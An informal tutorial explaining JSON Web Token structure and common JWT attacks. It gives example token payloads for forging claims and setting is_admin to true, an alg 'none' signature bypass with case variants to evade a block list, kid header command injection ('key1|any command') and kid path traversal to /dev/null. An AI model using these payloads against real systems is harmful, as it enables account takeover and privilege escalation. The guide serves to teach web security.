## JWT AND JWT ATTACKS
### > Hi everyone alien here and this day i'm gonna talk about:
* 1.1-what is jwt
* 1.2-jwt structure
* 2.1-jwt attacks
* 2.2-using jwt for bypass authentification
* 2.3-using jwt for escalate our privileges
> 1.1- what is jwt 
* first the jwt is shortcut of (JSON Web Token) and is a string that contains data, typically used to authenticate users . The JWT contains a cryptographic signatur this mean only server can create and modify tokens 
* What is JWT used for : is used to share information or crendential betwen the user and the server
  1.2- jwt format ( Structure)
![jwt structure](data:image/png;base64,)


* so like you see the jwt token consists of 3 parts: a header, a payload, and a signature the header and the payload of the jwt are base64url encoded, the header contain information about the token, the payload : contains the information about user in this example i will decode the payload 
```
{
    "iss": "alien",
    "exp": 117329921,
    "name": "alien here",
    "role": "blog_author",
    "email": "alien@alien.me",
    "iat": 1516239022
}

```
* 2.1- jwt attack:
> the jwt is sendinf modified jwt token to the server for reache same goals like bypass authetification or escalate their own privileges or controlling other users account ***The impact of JWT attacks*** is the attacker can build their own jwt token and reach here goals
2.2-using jwt for bypass authentification:
![image](data:image/jpeg;base64,)
> from the techniques to bypass authtification you can login to another user account just from decoding the value of jwt token changing her value and encode 

* this is the first value of jwt after encode him we can use for this thing this site [Base64url](https://www.base64url.com/)
```
{
  "name": "3obbi",
  "user_name": "john.doe",
  "is_admin": false
}




```
* so i will change the name value to :
```
{
  "name": "srghini",
  "user_name": "john.doe",
  "is_admin": false
}




```
2.3 escalate our privileges using jwt
* like you see in the token value we can find is_admin 
so let's change her value to ***true***
```
{
  "name": "srghini",
  "user_name": "jsrghini_hacker",
  "is_admin": true 
}


```
so now after changing the condition to true we are login to is_admin
> now i will talk about another same others jwt attack and vulnabilities
***Failing to verify the signature***
* decode(): Only decodes the token from base64url encoding without verifying the signature.
> not verifing the signature and accepting all the signature whit the valid format l
ead to arbitrary account access or privilege escalation.
***not verifing the type of algorithme and allowing the none*** :
* The JWT standard accepts different types of algorithms to generate a signature like :
> HMAC
>  none 
> Rsa 
*  the none algorithm specifies that the token is not signed,  If this algorithm is allowed we can bypass signature checking by changing an existing algorithm to None
> let's do a small example
```
{
  "alg": "HS256",
  "typ": "JWT" 
}.
{
  "username ": "animos lol ",
  "is_admin": false
}.SIGNATURe`
```
now we gonna change alg: H256 to none 
```
{
  "alg": "none",
  "typ": "JWT" 
}.
{
  "username ": "animos lol ",
  "is_admin": false
}.SIGNATURe`
```
if none is in black list you can bypass this for change the none to NOne or noNe

***kid parameter injections***
The JWT header can contain the Key Id parameter kid. It is often used to retrieve the key from a database or filesystem. If the parameter is injectable, it can open the way to signature bypass or even attacks such as RCE, SQLi,LFI.
so let's do it 
```
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key1"
}.
{
  
  "user_name": "hackor",
  "is_admin": false
}


```
if this parameter is vulnarable to os injection we can do small motivation or reverse shell or a command in kid
```
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key1|any command"
}.
{
  
  "user_name": "hackor",
  "is_admin": false
}


```
and onther example for to change the value of kid parameter to dev/null for forcing the server to use emptykey and using him key for verification if the kid parametre is vlnarable to ***directory traversal***
```
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": ../../../../../../dev/null"
}.
{
  
  "user_name": "hackor",
  "is_admin": false
}


```
